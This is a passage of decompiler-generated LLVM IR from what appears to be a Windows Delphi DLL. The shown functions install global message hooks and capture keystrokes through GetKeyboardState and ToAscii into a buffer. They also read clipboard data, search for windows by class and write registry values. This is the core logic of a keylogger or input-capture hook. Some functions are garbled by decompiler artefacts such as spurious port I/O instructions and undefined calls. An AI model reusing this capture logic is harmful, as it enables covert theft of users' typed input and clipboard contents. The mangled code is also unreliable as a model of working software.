  %91 = add i32 %arg6, -8, !insn.addr !724
  %92 = inttoptr i32 %91 to i32*, !insn.addr !724
  %93 = load i32, i32* %92, align 4, !insn.addr !724
  %94 = add i32 %esp.1.reload, -20, !insn.addr !725
  %95 = inttoptr i32 %94 to i32*, !insn.addr !725
  store i32 %93, i32* %95, align 4, !insn.addr !725
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !726
  %97 = load i32, i32* %92, align 4, !insn.addr !727
  %98 = add i32 %esp.1.reload, -24, !insn.addr !728
  %99 = inttoptr i32 %98 to i32*, !insn.addr !728
  store i32 %97, i32* %99, align 4, !insn.addr !728
  %100 = call i32 @function_4043a0(), !insn.addr !729
  %101 = load i32, i32* %99, align 4, !insn.addr !730
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !731
  store i32 4215789, i32* %90, align 4, !insn.addr !732
  %102 = call i32 @"@LStrClr"(), !insn.addr !733
  ret i32 %102, !insn.addr !734
}

define i32 @function_4053e6() local_unnamed_addr {
dec_label_pc_4053e6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !735
  ret i32 %0, !insn.addr !735
}

define i32 @function_4053eb() local_unnamed_addr {
dec_label_pc_4053eb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !736
}

define i32 @function_4053ed() local_unnamed_addr {
dec_label_pc_4053ed:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !737
}

define i32 @function_4053f1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4053f1:
  %.reg2mem = alloca i32, !insn.addr !738
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !738
  %5 = inttoptr i32 %2 to i8*, !insn.addr !738
  store i8 %4, i8* %5, align 1, !insn.addr !738
  %6 = add i32 %0, 111, !insn.addr !739
  %7 = inttoptr i32 %6 to i8*, !insn.addr !739
  %8 = load i8, i8* %7, align 1, !insn.addr !739
  %9 = trunc i32 %1 to i8, !insn.addr !739
  %10 = add i8 %8, %9, !insn.addr !739
  %11 = icmp eq i8 %10, 0, !insn.addr !739
  store i8 %10, i8* %7, align 1, !insn.addr !739
  br i1 %11, label %12, label %dec_label_pc_4053f9, !insn.addr !740

; <label>:12:                                     ; preds = %dec_label_pc_4053f1
  %13 = call i32 @unknown_5470(), !insn.addr !740
  br label %dec_label_pc_4053f9, !insn.addr !740

dec_label_pc_4053f9:                              ; preds = %12, %dec_label_pc_4053f1
  %14 = icmp ult i8 %10, %8, !insn.addr !739
  br i1 %14, label %dec_label_pc_405461, label %dec_label_pc_4053fc, !insn.addr !741

dec_label_pc_4053fc:                              ; preds = %dec_label_pc_4053f9
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !685, !insn.addr !739
  %16 = and i8 %15, 1, !insn.addr !739
  %17 = icmp eq i8 %16, 0, !insn.addr !739
  %18 = trunc i32 %arg4 to i16, !insn.addr !742
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !742
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !742
  store i32 %19, i32* %20, align 4, !insn.addr !742
  br i1 %17, label %dec_label_pc_40545c, label %dec_label_pc_405400, !insn.addr !743

dec_label_pc_405400:                              ; preds = %dec_label_pc_4053fc
  %21 = add i32 %arg4, 1, !insn.addr !744
  %22 = icmp eq i32 %21, 0, !insn.addr !744
  store i32 %arg2, i32* %.reg2mem, !insn.addr !745
  br i1 %22, label %dec_label_pc_405467, label %dec_label_pc_405406, !insn.addr !745

dec_label_pc_405406:                              ; preds = %dec_label_pc_405400
  %23 = add i32 %arg2, -1, !insn.addr !746
  %24 = trunc i32 %21 to i16, !insn.addr !747
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !747
  %26 = load i32, i32* %25, align 4, !insn.addr !747
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !747
  %27 = load i32, i32* %25, align 4, !insn.addr !748
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !748
  %28 = add i32 %arg7, 105, !insn.addr !749
  %29 = inttoptr i32 %28 to i8*, !insn.addr !749
  %30 = load i8, i8* %29, align 1, !insn.addr !749
  %31 = trunc i32 %23 to i8, !insn.addr !749
  %32 = add i8 %30, %31, !insn.addr !749
  %33 = icmp eq i8 %32, 0, !insn.addr !749
  store i8 %32, i8* %29, align 1, !insn.addr !749
  br i1 %33, label %dec_label_pc_405436, label %dec_label_pc_405416, !insn.addr !750

dec_label_pc_405416:                              ; preds = %dec_label_pc_405406
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !751
  %34 = inttoptr i32 %23 to i8*, !insn.addr !752
  %35 = load i8, i8* %34, align 1, !insn.addr !752
  %36 = add i8 %35, %31, !insn.addr !752
  store i8 %36, i8* %34, align 1, !insn.addr !752
  %37 = add i32 %arg5, 86, !insn.addr !753
  %38 = inttoptr i32 %37 to i8*, !insn.addr !753
  %39 = load i8, i8* %38, align 1, !insn.addr !753
  %40 = trunc i32 %21 to i8, !insn.addr !753
  %41 = add i8 %39, %40, !insn.addr !753
  store i8 %41, i8* %38, align 1, !insn.addr !753
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !754
  %42 = call i32 @"@LStrClr"(), !insn.addr !755
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !756
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !757
  %44 = zext i1 %43 to i32, !insn.addr !758
  ret i32 %44, !insn.addr !758

dec_label_pc_405436:                              ; preds = %dec_label_pc_405406
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !759
  %46 = inttoptr i32 %45 to i8*, !insn.addr !759
  %47 = load i8, i8* %46, align 2, !insn.addr !759
  %48 = mul i8 %47, 2, !insn.addr !759
  store i8 %48, i8* %46, align 2, !insn.addr !759
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !760
  %50 = icmp eq i32* %49, null, !insn.addr !761
  br i1 %50, label %dec_label_pc_405461, label %dec_label_pc_405446, !insn.addr !762

dec_label_pc_405446:                              ; preds = %dec_label_pc_405436
  %51 = ptrtoint i32* %49 to i32, !insn.addr !760
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !763
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !764
  %53 = icmp eq i32* %52, null, !insn.addr !765
  br i1 %53, label %dec_label_pc_405461, label %dec_label_pc_405452, !insn.addr !766

dec_label_pc_405452:                              ; preds = %dec_label_pc_405446
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !767
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !768
  br label %dec_label_pc_40545c, !insn.addr !768

dec_label_pc_40545c:                              ; preds = %dec_label_pc_405452, %dec_label_pc_4053fc
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !769
  br label %dec_label_pc_405461, !insn.addr !769

dec_label_pc_405461:                              ; preds = %dec_label_pc_40545c, %dec_label_pc_405446, %dec_label_pc_405436, %dec_label_pc_4053f9
  %56 = call i1 @CloseClipboard(), !insn.addr !770
  %57 = sext i1 %56 to i32, !insn.addr !770
  store i32 %57, i32* %.reg2mem, !insn.addr !771
  br label %dec_label_pc_405467, !insn.addr !771

dec_label_pc_405467:                              ; preds = %dec_label_pc_405400, %dec_label_pc_405461
  %.reload = load i32, i32* %.reg2mem, !insn.addr !772
  ret i32 %.reload, !insn.addr !772
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_40546c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !773
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !773
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !774
  %4 = inttoptr i32 %3 to i32*, !insn.addr !775
  %5 = load i32, i32* %4, align 4, !insn.addr !775
  %6 = icmp eq i32 %5, 0, !insn.addr !775
  %7 = icmp eq i1 %6, false, !insn.addr !776
  %8 = icmp eq i1 %7, false, !insn.addr !777
  br i1 %8, label %dec_label_pc_4054a8, label %dec_label_pc_40547f, !insn.addr !777

dec_label_pc_40547f:                              ; preds = %dec_label_pc_40546c
  %9 = inttoptr i32 %0 to i8*, !insn.addr !778
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !779
  %11 = icmp eq i32* %10, null, !insn.addr !780
  %12 = icmp eq i1 %11, false, !insn.addr !781
  br i1 %12, label %dec_label_pc_4054a8, label %dec_label_pc_405492, !insn.addr !781

dec_label_pc_405492:                              ; preds = %dec_label_pc_40547f
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4222148 to i32*), i32 0, i32* null), !insn.addr !782
  br label %dec_label_pc_4054a8, !insn.addr !782

dec_label_pc_4054a8:                              ; preds = %dec_label_pc_405492, %dec_label_pc_40547f, %dec_label_pc_40546c
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !783
  store i32 0, i32* %15, align 4, !insn.addr !783
  ret i32 -2147221231, !insn.addr !784
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4054d4:
  ret i32 0, !insn.addr !785
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4054d8:
  ret i32 0, !insn.addr !786
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4054dc:
  ret i32 0, !insn.addr !787
}

define i32 @function_4054e0() local_unnamed_addr {
dec_label_pc_4054e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !788
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !788
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !788
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !789
  %2 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !790
  %3 = add i32 %2, 1, !insn.addr !790
  store i32 %3, i32* @global_var_4096b0, align 4, !insn.addr !790
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !791
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !792
  ret i32 0, !insn.addr !793
}

define i32 @function_405505() local_unnamed_addr {
dec_label_pc_405505:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !794
  ret i32 %0, !insn.addr !794
}

define i32 @function_40550a() local_unnamed_addr {
dec_label_pc_40550a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !795
}

define i32 @function_40550c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40550c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !796
}

define i32 @function_405510() local_unnamed_addr {
dec_label_pc_405510:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !797
  %2 = add i32 %1, -1, !insn.addr !797
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !797
  ret i32 %0, !insn.addr !798
}

define i32 @function_405518(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405518:
  %esp.0.reg2mem = alloca i32, !insn.addr !799
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !800
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !800
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !800
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !801
  %4 = call i32 @function_4077a8(), !insn.addr !802
  %5 = icmp ne i32 %4, 0, !insn.addr !803
  %6 = icmp eq i1 %5, false, !insn.addr !804
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !805
  br i1 %6, label %dec_label_pc_405613, label %dec_label_pc_405555, !insn.addr !805

dec_label_pc_405555:                              ; preds = %dec_label_pc_405518
  switch i32 %0, label %dec_label_pc_40559f [
    i32 8, label %dec_label_pc_405563
    i32 46, label %dec_label_pc_405582
  ]

dec_label_pc_405563:                              ; preds = %dec_label_pc_405555
  %7 = call i32 @function_407844(), !insn.addr !806
  %8 = call i32 @"@LStrDelete"(), !insn.addr !807
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !808
  br label %dec_label_pc_405613, !insn.addr !808

dec_label_pc_405582:                              ; preds = %dec_label_pc_405555
  %9 = call i32 @function_407844(), !insn.addr !809
  %10 = call i32 @"@LStrDelete"(), !insn.addr !810
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !811
  br label %dec_label_pc_405613, !insn.addr !811

dec_label_pc_40559f:                              ; preds = %dec_label_pc_405555
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !812
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !813
  %14 = udiv i32 %1, 65536, !insn.addr !814
  %15 = and i32 %14, 255, !insn.addr !815
  %16 = inttoptr i32 %15 to i16*, !insn.addr !816
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !817
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !818
  %19 = icmp eq i32 %18, 1, !insn.addr !819
  %20 = icmp eq i1 %19, false, !insn.addr !820
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !820
  br i1 %20, label %dec_label_pc_405613, label %dec_label_pc_4055cb, !insn.addr !820

dec_label_pc_4055cb:                              ; preds = %dec_label_pc_40559f
  %21 = call i32 @function_40750c(), !insn.addr !821
  %22 = icmp eq i32 %21, 0, !insn.addr !822
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !823
  br i1 %22, label %dec_label_pc_405613, label %dec_label_pc_4055d7, !insn.addr !823

dec_label_pc_4055d7:                              ; preds = %dec_label_pc_4055cb
  %23 = call i32 @function_4034f4(), !insn.addr !824
  %24 = icmp sgt i32 %23, 15, !insn.addr !825
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !825
  br i1 %24, label %dec_label_pc_405613, label %dec_label_pc_4055e8, !insn.addr !825

dec_label_pc_4055e8:                              ; preds = %dec_label_pc_4055d7
  %25 = call i32 @function_407844(), !insn.addr !826
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !827
  %27 = call i32 @"@LStrInsert"(), !insn.addr !828
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !828
  br label %dec_label_pc_405613, !insn.addr !828

dec_label_pc_405613:                              ; preds = %dec_label_pc_4055e8, %dec_label_pc_4055d7, %dec_label_pc_4055cb, %dec_label_pc_40559f, %dec_label_pc_405582, %dec_label_pc_405563, %dec_label_pc_405518
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !829
  %29 = load i32, i32* %28, align 4, !insn.addr !829
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !830
  %30 = add i32 %esp.0.reload, 8, !insn.addr !831
  %31 = inttoptr i32 %30 to i32*, !insn.addr !831
  store i32 4216371, i32* %31, align 4, !insn.addr !831
  %32 = call i32 @"@LStrClr"(), !insn.addr !832
  ret i32 %32, !insn.addr !833
}

define i32 @function_40562c() local_unnamed_addr {
dec_label_pc_40562c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !834
  ret i32 %0, !insn.addr !834
}

define i32 @function_405631() local_unnamed_addr {
dec_label_pc_405631:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !835
}

define i32 @function_405633(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405633:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !836
}

define i32 @function_40563c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40563c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !837
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !837
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !837
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !838
  %2 = call i32 @function_4077a8(), !insn.addr !839
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !840
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !841
  %4 = add i32 %1, 8, !insn.addr !842
  %5 = inttoptr i32 %4 to i32*, !insn.addr !842
  store i32 4216578, i32* %5, align 4, !insn.addr !842
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !843
  ret i32 %6, !insn.addr !844
}

define i32 @function_4056fb() local_unnamed_addr {
dec_label_pc_4056fb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !845
  ret i32 %0, !insn.addr !845
}

define i32 @function_405700() local_unnamed_addr {
dec_label_pc_405700:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !846
}

define i32 @function_405702(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405702:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !847
}

define i32 @function_405708(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405708:
  %esp.0.reg2mem = alloca i32, !insn.addr !848
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !849
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !849
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !849
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !850
  %3 = call i32 @function_407718(), !insn.addr !851
  %4 = icmp eq i32 %3, 0, !insn.addr !852
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !853
  br i1 %4, label %dec_label_pc_40576c, label %dec_label_pc_405729, !insn.addr !853

dec_label_pc_405729:                              ; preds = %dec_label_pc_405708
  %5 = inttoptr i32 %0 to i8*, !insn.addr !854
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405790 to i32*), i8* null, i8* %5), !insn.addr !855
  %7 = ptrtoint i32* %6 to i32, !insn.addr !855
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !856
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !856
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !857
  %10 = icmp eq i1 %9, false, !insn.addr !858
  br i1 %10, label %dec_label_pc_405767, label %dec_label_pc_405744, !insn.addr !859

dec_label_pc_405744:                              ; preds = %dec_label_pc_405729
  %11 = call i32 @function_407578(), !insn.addr !860
  %12 = call i32 @"@LStrAsg"(), !insn.addr !861
  %13 = call i32 @function_4078a0(), !insn.addr !862
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !863
  br label %dec_label_pc_40576c, !insn.addr !863

dec_label_pc_405767:                              ; preds = %dec_label_pc_405729
  %14 = call i32 @function_4079d4(), !insn.addr !864
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !864
  br label %dec_label_pc_40576c, !insn.addr !864

dec_label_pc_40576c:                              ; preds = %dec_label_pc_405767, %dec_label_pc_405744, %dec_label_pc_405708
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !865
  %16 = load i32, i32* %15, align 4, !insn.addr !865
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !866
  %17 = add i32 %esp.0.reload, 8, !insn.addr !867
  %18 = inttoptr i32 %17 to i32*, !insn.addr !867
  store i32 4216713, i32* %18, align 4, !insn.addr !867
  %19 = call i32 @"@LStrClr"(), !insn.addr !868
  ret i32 %19, !insn.addr !869
}

define i32 @function_405782() local_unnamed_addr {
dec_label_pc_405782:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !870
  ret i32 %0, !insn.addr !870
}

define i32 @function_405787() local_unnamed_addr {
dec_label_pc_405787:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !871
}

define i32 @function_405789(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405789:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !872
}

define i32 @function_40578d() local_unnamed_addr {
dec_label_pc_40578d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !873
  %8 = inttoptr i32 %4 to i8*, !insn.addr !873
  store i8 %7, i8* %8, align 1, !insn.addr !873
  %9 = add i32 %2, 111, !insn.addr !874
  %10 = inttoptr i32 %9 to i8*, !insn.addr !874
  %11 = load i8, i8* %10, align 1, !insn.addr !874
  %12 = load i32, i32* %eax, align 4, !insn.addr !874
  %13 = trunc i32 %12 to i8, !insn.addr !874
  %14 = add i8 %11, %13, !insn.addr !874
  store i8 %14, i8* %10, align 1, !insn.addr !874
  %15 = trunc i32 %3 to i16, !insn.addr !875
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !875
  %17 = inttoptr i32 %0 to i32*, !insn.addr !875
  store i32 %16, i32* %17, align 4, !insn.addr !875
  %18 = add i32 %0, 66, !insn.addr !876
  %19 = inttoptr i32 %18 to i64*, !insn.addr !876
  %20 = load i64, i64* %19, align 4, !insn.addr !876
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !876
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !877
  %22 = load i8, i8* %5, align 4, !insn.addr !878
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !878
  %25 = add i8 %22, %24, !insn.addr !878
  %26 = inttoptr i32 %23 to i8*, !insn.addr !878
  store i8 %25, i8* %26, align 1, !insn.addr !878
  %27 = add i32 %21, -117, !insn.addr !879
  %28 = inttoptr i32 %27 to i8*, !insn.addr !879
  %29 = load i8, i8* %28, align 1, !insn.addr !879
  %30 = trunc i32 %3 to i8, !insn.addr !879
  %31 = add i8 %29, %30, !insn.addr !879
  store i8 %31, i8* %28, align 1, !insn.addr !879
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !880
  %33 = add i32 %21, 16, !insn.addr !881
  %34 = inttoptr i32 %33 to i32*, !insn.addr !881
  %35 = load i32, i32* %34, align 4, !insn.addr !881
  %36 = add i32 %21, 12, !insn.addr !882
  %37 = inttoptr i32 %36 to i32*, !insn.addr !882
  %38 = load i32, i32* %37, align 4, !insn.addr !882
  %39 = add i32 %21, 8, !insn.addr !883
  %40 = inttoptr i32 %39 to i32*, !insn.addr !883
  %41 = load i32, i32* %40, align 4, !insn.addr !883
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !884
  %43 = inttoptr i32 %42 to i32*, !insn.addr !885
  %44 = load i32, i32* %43, align 4, !insn.addr !885
  %45 = icmp eq i32 %44, 0, !insn.addr !885
  %46 = icmp eq i1 %45, false, !insn.addr !886
  %47 = icmp eq i32 %41, 0, !insn.addr !887
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !888
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_4057c3, label %dec_label_pc_4057f2, !insn.addr !889

dec_label_pc_4057c3:                              ; preds = %dec_label_pc_40578d
  store i32 %35, i32* %eax, align 4, !insn.addr !890
  %51 = add i32 %35, 4, !insn.addr !891
  %52 = inttoptr i32 %51 to i32*, !insn.addr !891
  %53 = load i32, i32* %52, align 4, !insn.addr !891
  switch i32 %53, label %dec_label_pc_4057f2 [
    i32 256, label %dec_label_pc_4057da
    i32 770, label %dec_label_pc_4057eb
  ]

dec_label_pc_4057da:                              ; preds = %dec_label_pc_4057c3
  %54 = call i32 @function_405518(i32 %2, i32 %1, i32 %0), !insn.addr !892
  br label %dec_label_pc_4057f2, !insn.addr !893

dec_label_pc_4057eb:                              ; preds = %dec_label_pc_4057c3
  %55 = call i32 @function_40563c(i32 %2, i32 %1, i32 %0), !insn.addr !894
  br label %dec_label_pc_4057f2, !insn.addr !894

dec_label_pc_4057f2:                              ; preds = %dec_label_pc_40578d, %dec_label_pc_4057c3, %dec_label_pc_4057eb, %dec_label_pc_4057da
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !895
  %57 = inttoptr i32 %35 to i32*, !insn.addr !896
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !896
  ret i32 %58, !insn.addr !897
}

define i32 @function_405808(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !898
  %5 = icmp eq i1 %4, false, !insn.addr !899
  %6 = icmp eq i32 %arg3, 0, !insn.addr !900
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405826, label %dec_label_pc_405838, !insn.addr !901

dec_label_pc_405826:                              ; preds = %dec_label_pc_405808
  %8 = add i32 %arg1, 8, !insn.addr !902
  %9 = inttoptr i32 %8 to i32*, !insn.addr !902
  %10 = load i32, i32* %9, align 4, !insn.addr !902
  %11 = icmp eq i32 %10, 2, !insn.addr !903
  %12 = icmp eq i1 %11, false, !insn.addr !904
  br i1 %12, label %dec_label_pc_405838, label %dec_label_pc_405830, !insn.addr !904

dec_label_pc_405830:                              ; preds = %dec_label_pc_405826
  %13 = call i32 @function_405708(i32 %1, i32 %2, i32 %0), !insn.addr !905
  br label %dec_label_pc_405838, !insn.addr !905

dec_label_pc_405838:                              ; preds = %dec_label_pc_405808, %dec_label_pc_405830, %dec_label_pc_405826
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !906
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !907
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !907
  ret i32 %16, !insn.addr !908
}

define i32 @function_405850() local_unnamed_addr {
dec_label_pc_405850:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4216732 to i32*), i32 3), !insn.addr !909
  %2 = ptrtoint i32* %1 to i32, !insn.addr !909
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !910
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216840 to i32*), i32 4), !insn.addr !911
  %5 = ptrtoint i32* %4 to i32, !insn.addr !911
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !912
  ret i32 %5, !insn.addr !913
}

define i32 @function_405888() local_unnamed_addr {
dec_label_pc_405888:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !914
  %1 = inttoptr i32 %0 to i32*, !insn.addr !915
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !915
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !916
  %4 = inttoptr i32 %3 to i32*, !insn.addr !917
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !917
  %6 = sext i1 %5 to i32, !insn.addr !917
  ret i32 %6, !insn.addr !918
}

define i32 @function_4058a0() local_unnamed_addr {
dec_label_pc_4058a0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !919
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !919
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !919
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !920
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !921
  %3 = add i32 %2, 1, !insn.addr !921
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !921
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !922
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !923
  ret i32 0, !insn.addr !924
}

define i32 @function_4058c5() local_unnamed_addr {
dec_label_pc_4058c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !925
  ret i32 %0, !insn.addr !925
}

